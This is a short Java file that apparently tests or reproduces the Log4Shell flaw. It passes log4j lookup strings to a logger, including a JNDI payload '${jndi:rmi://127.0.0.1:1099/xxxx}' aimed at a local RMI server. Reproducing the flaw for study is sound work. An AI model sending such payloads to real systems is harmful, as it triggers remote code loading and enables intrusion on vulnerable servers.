package dao;
import org.apache.log4j.Logger;

public class dome {
    public static final Logger logger=Logger.getLogger(JunitTest.class);
    public static void main(String[] args){
        String msg="${java:hw}";
        logger.info(msg);
        logger.error("${jndi:rmi://127.0.0.1:1099/xxxx}");
    }
}
